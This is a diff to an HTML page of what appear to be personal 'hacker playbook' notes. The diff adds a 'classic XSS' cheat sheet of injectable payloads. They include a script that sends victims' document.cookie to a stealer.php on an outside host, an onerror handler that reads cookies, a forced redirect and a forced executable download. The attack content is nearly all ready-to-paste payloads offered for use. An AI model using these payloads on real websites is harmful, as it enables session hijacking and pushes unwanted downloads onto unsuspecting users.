@@ -1,11 +1,11 @@
 <!doctype html><html>
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <title>secnotes.ctb</title>
+  <title>classic XSS</title>
   <meta name="generator" content="CherryTree">
   <link rel="stylesheet" href="styles.css" type="text/css" />
 </head>
-<body><div class="tree">
+<body><div class="main"><div class="tree">
 <p><strong>Index</strong></p>
 <p><a href="Hacker-playbook--Webapps-attack.html">Webapps-attack</a></p>
 
@@ -50,4 +50,5 @@
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--lab.html">lab</a></li>
 <li><a href="Hacker-playbook--Webapps-attack--XML-XXE--Advanced_XXE_OOB.html">Advanced XXE OOB</a></li>
 </ol></ol></div>
+<div class="page"><h1><b><u>classic XSS</u></b></h1><br /><br /><strong><br /></strong><strong><h3>• Simple Alert XSS : </h3></strong><strong><br /></strong><br />&lt;script&gt;alert('polo')&lt;/script&gt;<br /> <br /><br /><h3>• </h3><strong><h3>redirection :</h3></strong><strong><br /></strong><br />&lt;img src="<a href="http://192.168.43.25:443"">http://192.168.43.25:443"</a> onerror=alert(document.cookie)&gt;<br /><br /><h3>• </h3><strong><h3>stealing cookie :</h3></strong><br /><br />&lt;script&gt;document.write(`&lt;img src="<a href="http://10.0.4.60/stealer.php?cookie='">http://192.168.1.42/stealer.php?cookie='</a>%2B document.cookie %2B'"/&gt;`);&lt;/script&gt;<br /><br /><br /><strong><h3>• Redirect user :</h3></strong><strong><span style="text-decoration:underline;"><br /><br /></span></strong>&lt;script&gt;window.location="http://www.polo.com";&lt;/script&gt;<br /><br /><strong><br /></strong><strong><h3>• Forcing user to download something :</h3></strong><strong><br /></strong><br /><br />&lt;script&gt;var link = document.createElement('a'); link.href = '<a href="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';</a> link.download = ''; document.body.appendChild(link); link.click();&lt;/script&gt;<br /><br /><br /></div></div>
 </body></html>
